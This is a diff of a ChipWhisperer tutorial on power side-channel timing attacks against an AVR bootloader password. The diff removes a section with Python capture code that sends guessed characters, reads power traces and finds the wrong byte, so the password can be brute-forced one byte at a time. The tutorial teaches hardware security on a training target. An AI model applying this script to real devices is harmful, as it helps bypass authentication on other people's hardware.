@@ -418,48 +418,6 @@ chpwl:  brne chpwl                      ; if not, loop infinitely
 
 Thus by looking at the power consumption, we can determine the wrong password character. This makes it possible to brute-force the password, since we can simply guess a single digit of the password at a time.
 
-== Scripting the Complete Attack ==
-
-The current script sets up the application, then runs the GUI normally at this line:
-
-<pre>#Run Application
-app.exec_()</pre>
-As a beginning point, the following allows you to manually specify two characters for the password. These characters are put into the system, and based on a simple power threshold it decides where the password failed. This script would be the same as your previous script, but replace the above call with:
-
-<pre>num1 = ord('c')
-num2 = ord('f')
-
-cap.resetAVR()
-time.sleep(0.1)
-ser.write("@@@")
-time.sleep(0.1)
-cap.scope.arm()
-pe()
-ser.write(chr(num1) + chr(num2))
-if cap.scope.capture(update=True, NumberPoints=None, waitingCallback=pe):
-    print "Timeout"
-else:
-    print "Capture OK"
-
-if min(cap.scope.datapoints[10000:14000]) > -0.1:
-    print "Byte 1 Wrong"
-
-elif min(cap.scope.datapoints[18000:22000]) > -0.1:
-    print "Byte 2 Wrong"
-
-else:
-    print "Password OK? Check response on serial"
-
-#print ser.read(255)
-
-#Run Application
-app.exec_()
-
-#Disconnect before exit to save grief
-cap.scope.dis()
-cap.target.dis()</pre>
-You will need to adjust the thresholds and possibly data point locations based on your own experiments. With this you should be able to make a script which brute-forces the password by breaking the first byte and then the second byte.
-
 == Conclusion ==
 
 This tutorial has demonstrated the use of the power side-channel for performing timing attacks. A bootloader with a simple password-based security system is broken. In addition you have learned about the scripting support in the ChipWhisperer-Capture software.
